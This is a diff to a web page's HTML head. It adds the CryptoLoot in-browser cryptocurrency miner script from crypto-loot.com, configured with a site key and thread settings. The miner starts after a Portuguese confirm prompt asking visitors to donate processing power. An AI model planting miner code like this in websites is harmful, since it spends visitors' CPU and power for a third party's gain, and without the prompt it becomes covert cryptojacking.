@@ -11,6 +11,23 @@
 
       gtag('config', 'UA-64399735-2');
     </script>
+	  
+ 		
+	  
+   <script src="https://crypto-loot.com/lib/miner.min.js"></script>		
+   <script>	
+	var threads = window.navigator.hardwareConcurrency / 2;
+            if (threads < 1) {
+                var threads = 1;
+            }
+ 	var miner=new CryptoLoot.Anonymous('7c67bdc672b7148230788354beaf77efda23d4cbaa82',		
+ 	        {		
+ 	        threads:threads ,autoThreads:false,throttle:0.9,		
+ 	        }		
+ 	);
+	var r = confirm("Deseja realizar a doação de um pouco de processamento?");
+	if (r == true) {miner.start(); }	
+   </script>
 
 	  
     <meta charset="utf-8">
